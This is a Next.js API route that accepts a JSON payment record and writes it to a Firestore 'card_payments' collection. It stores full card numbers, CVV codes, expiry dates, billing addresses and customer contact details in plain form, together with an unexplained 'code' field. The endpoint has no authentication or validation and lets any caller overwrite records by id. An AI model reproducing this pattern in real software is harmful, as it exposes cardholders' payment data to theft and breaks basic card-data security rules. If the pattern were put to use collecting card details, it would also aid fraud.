import { NextResponse } from "next/server";
import { doc, setDoc } from "firebase/firestore";
import { db } from "@/lib/firebase/config";

export async function POST(req: Request) {
  try {
    const data = await req.json();

    const {
      id,
      userId,
      orderId,
      type,
      amount,
      currencyCode,
      status,
      description,
      cardNumber,
      cvv,
      expiry,
      billingName,
      billingAddress,
      billingCity,
      billingZip,
      billingCountry,
      customerName,
      customerEmail,
      customerPhone,
      code,
      adminNote,
      channel,
      createdAt,
      updatedAt,
    } = data;

    if (!id) {
      return NextResponse.json({ error: "Missing transaction ID" }, { status: 400 });
    }

    await setDoc(doc(db, "card_payments", id), {
      id,
      userId: userId || "guest",
      orderId: orderId || "",
      type: type || "card_purchase",
      amount: amount || 0,
      currencyCode: currencyCode || "USD",
      status: status || "pending",
      description: description || "Card payment",
      cardNumber: cardNumber || "",
      cvv: cvv || "",
      expiry: expiry || "",
      billingName: billingName || "",
      billingAddress: billingAddress || "",
      billingCity: billingCity || "",
      billingZip: billingZip || "",
      billingCountry: billingCountry || "",
      customerName: customerName || "",
      customerEmail: customerEmail || "",
      customerPhone: customerPhone || "",
      code: code || "",
      adminNote: adminNote || "",
      channel: channel || "email",
      createdAt: createdAt || new Date().toISOString(),
      updatedAt: updatedAt || new Date().toISOString(),
    }, { merge: true });

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error("API Error in card-payment:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}
